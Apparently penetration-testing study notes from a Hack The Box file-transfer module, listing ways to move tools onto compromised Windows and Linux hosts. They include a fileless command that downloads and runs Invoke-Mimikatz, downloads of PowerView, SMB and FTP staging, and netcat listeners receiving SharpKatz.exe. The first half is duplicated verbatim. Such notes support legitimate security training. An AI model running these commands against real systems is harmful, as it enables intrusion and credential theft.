

# Bash Script Commands

PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data from a resource:


- OpenRead	Returns the data from a resource as a Stream.

- OpenReadAsync	Returns the data from a resource without blocking the calling thread.

- DownloadData	Downloads data from a resource and returns a Byte array.

- DownloadDataAsync	Downloads data from a resource and returns a Byte array without blocking the calling thread.

- DownloadFile	Downloads data from a resource to a local file.
DownloadFileAsync	Downloads data from a resource to a local file without blocking the calling thread.

- DownloadString	Downloads a String from a resource and returns a String.

- DownloadStringAsync	Downloads a String from a resource without blocking the calling thread.

## PowerShell DownloadFile Method

We can specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name.

- PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
- PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

- PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
- PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')


## Fileless Method 
- PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

## Invoke webrequest
- PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

# Common Errors with PowerShell
- There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.


# Bash Script Commands

PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data from a resource:


- OpenRead	Returns the data from a resource as a Stream.

- OpenReadAsync	Returns the data from a resource without blocking the calling thread.

- DownloadData	Downloads data from a resource and returns a Byte array.

- DownloadDataAsync	Downloads data from a resource and returns a Byte array without blocking the calling thread.

- DownloadFile	Downloads data from a resource to a local file.
DownloadFileAsync	Downloads data from a resource to a local file without blocking the calling thread.

- DownloadString	Downloads a String from a resource and returns a String.

- DownloadStringAsync	Downloads a String from a resource without blocking the calling thread.

## PowerShell DownloadFile Method

We can specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name.

- PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
- PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

- PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
- PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')


## Fileless Method 
- PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

## Invoke webrequest
- PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

# Common Errors with PowerShell
- There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.

## Creating an SMB Server
- AadhaarKoul@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

## Copying from an SMB Server
- C:\htb> copy \\192.168.220.133\share\nc.exe

## Creating an SMB Server with credentials
- Aadhaar Koul@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

## Mounting the SMB server 
- C:\htb> net use n: \\192.168.220.133\share /user:test test

# FTP File Transfers using Python 
## Installing pytohn module 
- Aadhaar Koul@htb[/htb]$ sudo pip3 install pyftpdlib

## Setting up the server 
- Aadhaar Koul@htb[/htb]$ sudo python3 -m pyftpdlib --port 21

## Transferrring Files from an FTP Server
- PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')

## Create a Command File for the FTP Client and Download the Target File
- C:\htb> echo open 192.168.49.128 > ftpcommand.txt
- C:\htb> echo USER anonymous >> ftpcommand.txt
- C:\htb> echo binary >> ftpcommand.txt
- C:\htb> echo GET file.txt >> ftpcommand.txt
- C:\htb> echo bye >> ftpcommand.txt
- C:\htb> ftp -v -n -s:ftpcommand.txt
- ftp> open 192.168.49.128
- Log in with USER and PASS first.
- ftp> USER anonymous

- ftp> GET file.txt
- ftp> bye

- C:\htb>more file.txt
- This is a test file

# File Transfer and Downloading methods in LINUX
- echo
- wget
- curl
- exec
- ssh
- netstat
- scp : Aadhaar Koul@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
- openssl

# Transferring files through Javascript
JavaScript is a scripting or programming language that allows you to implement complex features on web pages. Like with other programming languages, we can use it for many different things.

The following JavaScript code is based on this post, and we can download a file using it. We'll create a file called wget.js and save the following content:

- var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
- WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
- WinHttpReq.Send();
- BinStream = new ActiveXObject("ADODB.Stream");
- BinStream.Type = 1;
- BinStream.Open();
- BinStream.Write(WinHttpReq.ResponseBody);
- BinStream.SaveToFile(WScript.Arguments(1));

# File transfers using Netcat
The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example and transfer a tool to our target.

In this example, we'll transfer SharpKatz.exe from our Pwnbox onto the compromised machine. We'll do it using two methods. Let's work through the first one.

We'll first start Netcat (nc) on the compromised machine, listening with option -l, selecting the port to listen with the option -p 8000, and redirect the stdout using a single greater-than > followed by the filename, SharpKatz.exe.

## NetCat - Compromised Machine - Listening on Port 8000
- victim@target:~$ nc -l -p 8000 > SharpKatz.exe

## Ncat - Compromised Machine - Listening on Port 8000
- victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe


